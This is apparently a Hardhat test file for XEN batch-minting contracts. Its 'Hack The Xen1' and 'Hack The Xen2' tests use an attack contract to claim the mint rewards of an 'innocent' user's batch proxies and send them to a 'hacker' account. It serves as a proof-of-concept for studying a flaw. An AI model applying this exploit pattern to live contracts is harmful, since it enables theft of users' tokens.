const { expect } = require("chai");
const {ethers} = require("hardhat");

async function increaseTime(value) {
  if (!ethers.BigNumber.isBigNumber(value)) {
    value = ethers.BigNumber.from(value);
  }
  await ethers.provider.send('evm_increaseTime', [value.toNumber()]);
  await ethers.provider.send('evm_mine');
}

describe("BugBathchXen1 Contract", function(){
  before(async function () {
    this.signer = (await ethers.getSigners())[0]
    const BatchXen1 = await hre.ethers.getContractFactory("BugBatchXen1", this.signer);
    this.batchXen1 = await BatchXen1.deploy({gasLimit: 30000000});
    // console.log("BatchXen1 Address",this.batchXen1.address)
    await this.batchXen1.deployed();

    const BatchXen2 = await hre.ethers.getContractFactory("BugBatchXen2", this.signer);
    this.batchXen2 = await BatchXen2.deploy({gasLimit: 30000000});
    await this.batchXen2.deployed();

    // 一个是用源码来创合约, 一个是给定abi来创建
    let address = '0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8'
    let abi = require('../abi/XEN.json')
    this.xen = new hre.ethers.Contract(address, abi, this.signer);

    //Hack1
    const HackBatchXen1 = await hre.ethers.getContractFactory("HackBatchXen1", this.signer);
    this.hackBatchXen1 = await HackBatchXen1.deploy({gasLimit: 30000000});
    await this.hackBatchXen1.deployed();
  });

  it("Normal Xen, Wrong Time Gap", async function(){
    const user = (await ethers.getSigners())[1]
    expect(await this.xen.balanceOf(this.signer.address)).to.equal(0);
    expect(await this.xen.balanceOf(user.address)).to.equal(0);
    let tx = await this.xen.connect(user).claimRank(2);
    await tx.wait()
    await increaseTime(24 * 60 * 60)
    await expect(this.xen.connect(user).claimMintReward()).to.be.revertedWith("CRank: Mint maturity not reached");
  });

  it("Normal Xen, Right Time Gap", async function(){
    const user = (await ethers.getSigners())[2]
    expect(await this.xen.balanceOf(this.signer.address)).to.equal(0);
    expect(await this.xen.balanceOf(user.address)).to.equal(0);
    let tx = await this.xen.connect(user).claimRank(1);
    await tx.wait()
    await increaseTime(24 * 60 * 60)
    tx = await this.xen.connect(user).claimMintReward()
    // 
    await tx.wait()
    expect(await this.xen.balanceOf(user.address)).to.be.above(0);
  });

  it("Use Batch Xen1 Correctlly", async function(){
    // console.log((await this.xen.balanceOf(((await ethers.getSigners())[2].address)))/1e18)
    expect(await this.xen.balanceOf(((await ethers.getSigners())[2].address))).to.above(0);
    let amount = 10
    let tx = await this.batchXen1.batchClaimRank(amount, 1)
    await tx.wait()
    await increaseTime(24 * 60 * 60)
    tx = await this.batchXen1.batchClaimMintReward(amount)
    await tx.wait()
    // console.log((await this.xen.balanceOf(this.signer.address))/1e18)
    expect(await this.xen.balanceOf(this.signer.address)).to.be.above(0);
  });

  it("Hack The Xen1", async function(){
    let innocenter = (await ethers.getSigners())[3]
    let hacker = (await ethers.getSigners())[4]
    expect(await this.xen.balanceOf(innocenter.address)).to.equal(0);
    expect(await this.xen.balanceOf(hacker.address)).to.equal(0);
    let amount = 10
    let tx = await this.batchXen1.connect(innocenter).batchClaimRank(amount, 1)
    await tx.wait()
    await increaseTime(24 * 60 * 60)

    // 这个合约地址是先跑一边拿到的
    tx = await this.hackBatchXen1.connect(hacker).attack("0xe9cb02c1bec789e0219cdffeec502de833979f2c")
    await tx.wait()
    // console.log("Hacker Xen1 Balance",(await this.xen.balanceOf(hacker.address))/1e18)
    expect(await this.xen.balanceOf(hacker.address)).to.be.above(0);
  })

  it("Use Batch Xen2 Correctlly", async function(){
    let afterXen1Balance = await this.xen.balanceOf(this.signer.address)
    // console.log(afterXen1Balance/1e18)
    // console.log((await this.xen.balanceOf(((await ethers.getSigners())[2].address)))/1e18)
    let amount = 10
    let tx = await this.batchXen2.batchClaimRank(0, amount, 1)
    await tx.wait()
    await increaseTime(24 * 60 * 60)
    tx = await this.batchXen2.batchClaimMintReward(0, amount)
    await tx.wait()
    // console.log((await this.xen.balanceOf(this.signer.address))/1e18)
    expect(await this.xen.balanceOf(this.signer.address)).to.be.above(afterXen1Balance);
  });

  it("Hack The Xen2", async function(){
    let innocenter = (await ethers.getSigners())[5]
    let hacker = (await ethers.getSigners())[6]
    expect(await this.xen.balanceOf(innocenter.address)).to.equal(0);
    expect(await this.xen.balanceOf(hacker.address)).to.equal(0);
    let amount = 10
    let tx = await this.batchXen2.connect(innocenter).batchClaimRank(0, amount, 1)
    await tx.wait()
    await increaseTime(24 * 60 * 60)

    // tx = await this.batchXen2.connect(innocenter).batchClaimMintReward(0, amount)
    // await tx.wait()
    // // console.log((await this.xen.balanceOf(this.signer.address))/1e18)
    // expect(await this.xen.balanceOf(innocenter.address)).to.be.above(0);
    // 这个合约地址是先跑一边拿到的
    tx = await this.hackBatchXen1.connect(hacker).attack("0xc17b2e80318a3d4900376b8faeafae8702eba7ab")
    await tx.wait()
    // console.log("Hacker Xen1 Balance",(await this.xen.balanceOf(hacker.address))/1e18)
    expect(await this.xen.balanceOf(hacker.address)).to.be.above(0);
  })


});